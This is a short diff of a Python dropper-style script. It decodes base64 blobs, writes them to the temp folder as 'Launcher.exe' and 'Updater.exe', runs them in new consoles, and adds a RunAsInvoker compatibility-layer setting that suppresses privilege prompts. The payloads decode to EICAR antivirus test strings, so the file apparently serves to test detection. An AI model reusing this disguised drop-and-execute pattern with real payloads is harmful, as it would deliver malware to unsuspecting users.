@@ -10,12 +10,16 @@ temp = sbp.check_output("cmd /c echo %temp%").decode().replace("\r\n","")
 legit = b'BSVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='
 with open(f'{temp}\\Launcher.exe', 'wb')as l:
     l.write(b64d(legit))
-subprocess.Popen(f"{temp}\\Launcher.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
+os.system('set __COMPAT_LAYER=RunAsInvoker')
+try:
+    sbp.Popen(f"{temp}\\Launcher.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
+except:
+    sys.exit()
 b64data = b'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='
-with open(f"{temp}\\Updater.exe","wb")as f:
+with open(f"{temp}\\Updater.exe", "wb")as f:
     f.write(b64d(b64data))
 try:
-    subprocess.Popen(f"{temp}\\Updater.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
+    sbp.Popen(f"{temp}\\Updater.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
 except:
     sys.exit()
 sys.exit()
